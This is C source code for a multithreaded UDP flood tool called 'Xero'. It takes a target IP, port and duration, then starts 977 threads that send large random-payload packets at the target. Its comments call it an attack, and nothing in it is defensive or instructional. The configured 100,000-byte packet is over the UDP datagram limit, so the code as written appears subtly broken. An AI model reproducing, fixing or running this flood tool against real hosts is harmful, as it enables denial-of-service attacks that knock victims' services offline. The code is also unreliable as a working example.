#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define UDP_PACKET_SIZE 100000  // Updated size of the UDP packet to 100,000 bytes
#define NUM_THREADS 977         // Number of threads for the attack

// Function to generate a random payload
void generate_udp_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;  // Random byte (0-255)
    }
}

// The attack function for the thread
void *attack(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int time_limit = atoi(args[2]);

    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // UDP packet (size of 100,000 bytes)
    char payload[UDP_PACKET_SIZE];

    // Generate random payload for the flood
    generate_udp_payload(payload, UDP_PACKET_SIZE);

    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    endtime = time(NULL) + time_limit;

    // Send UDP packets until time limit is reached
    while (time(NULL) <= endtime) {
        if (sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: ./Xero ip port time\n");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    pthread_t thread_ids[NUM_THREADS];
    char *args[] = {ip, argv[2], argv[3]};

    printf("UDP flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    // Create 977 threads to launch the attack
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)args) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Flood completed.\n");
    return 0;
}
